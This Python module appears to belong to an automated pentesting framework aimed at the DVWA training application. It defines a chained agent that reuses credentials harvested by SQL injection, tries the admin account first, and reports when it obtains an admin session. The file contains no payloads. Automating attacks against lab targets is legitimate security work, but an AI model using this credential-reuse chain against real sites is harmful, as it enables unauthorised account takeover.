"""Tier 3 chain agent: SQLi -> credentials -> admin session."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import make_update
from core.state import ExploitationState
from foundation.session_manager import DVWASession


class SQLiToCredsChainAgent(BaseAgent):
    module_name = "sqli"

    def check_prerequisites(self, state: ExploitationState) -> bool:
        confirmed = set(state.get("confirmed_vulns", []))
        return {"sqli_confirmed", "credentials_extracted"}.issubset(confirmed)

    def run(self, state: ExploitationState) -> dict[str, Any]:
        tried_now = ["chain:sqli_to_creds"]
        score = 0
        confirmed: list[str] = []

        if not self.check_prerequisites(state):
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        target_url = state.get("target_url", "")
        credentials = list(state.get("found_credentials", []))
        success = False

        if target_url and credentials:
            session = DVWASession(target_url)
            try:
                # Prefer admin credentials when available.
                ordered = sorted(
                    credentials,
                    key=lambda item: 0 if item.get("username") == "admin" else 1,
                )
                for pair in ordered:
                    username = str(pair.get("username", ""))
                    password = str(pair.get("password", ""))
                    if not username or not password:
                        continue
                    tried_now.append(f"login:{username}")
                    if session.login(username, password):
                        success = True
                        break
            except Exception:
                pass
            finally:
                session.close()

        if success:
            score = 4
            confirmed = ["admin_session_obtained"]

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
        )


_AGENT = SQLiToCredsChainAgent()


def sqli_to_creds_chain(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
